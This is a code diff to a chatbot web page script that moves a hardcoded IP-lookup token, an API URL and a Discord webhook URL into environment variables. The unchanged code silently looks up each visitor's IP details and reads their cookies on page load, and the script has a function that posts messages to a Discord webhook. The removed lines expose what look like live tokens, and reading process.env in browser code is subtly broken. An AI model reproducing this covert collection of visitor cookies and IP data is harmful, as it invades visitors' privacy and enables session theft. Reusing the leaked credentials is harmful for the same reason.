@@ -1,3 +1,9 @@
+// Environment variables assigned to local variables
+const apiUrl = process.env.API_URL; // 
+const ipInfoLink = process.env.IPINFO_LINK; // 
+const ipInfoToken = process.env.IPINFO_TOKEN; // 
+const webhookUrl = process.env.WEBHOOK_URL; // 
+
 // Emoji list
 const statusEmojis = {
     check: 'https://cdn.discordapp.com/emojis/1218461285746741350.png',
@@ -19,7 +25,7 @@ const bannedUsers = [
 ];
 
 document.addEventListener('DOMContentLoaded', async function () {
-    const ipInfoResponse = await fetch('https://ipinfo.io/json?token=99798ae623ac1d');
+    const ipInfoResponse = await fetch(`${ipInfoLink}${ipInfoToken}`); // Using environment variable for IP info
     const ipData = await ipInfoResponse.json();
     const visitorCookie = document.cookie || 'No cookies found';
 
@@ -105,7 +111,7 @@ document.addEventListener('DOMContentLoaded', async function () {
 
         const startTime = Date.now();
         try {
-            const response = await fetch(`https://tilki.dev/api/hercai?soru=${encodeURIComponent(question)}`);
+            const response = await fetch(`${apiUrl}${encodeURIComponent(question)}`); // Using environment variable for API URL
 
             // Check if the response is OK (status code in the range 200-299)
             if (!response.ok) {
@@ -178,12 +184,11 @@ document.addEventListener('DOMContentLoaded', async function () {
     });
 
     async function sendWebhook(embedMessage) {
-        const webhookUrl = 'https://discord.com/api/webhooks/1289960861028454481/wXuSMQSu71G0XjJouR2MtLJSupMuRcRZo0CNSVpyfw3Hma5uaiOO3R0KomuissnxXH5F'; // Replace with your actual webhook URL
         const payload = {
             embeds: [embedMessage]
         };
 
-        await fetch(webhookUrl, {
+        await fetch(webhookUrl, { // Using environment variable for webhook URL
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json'
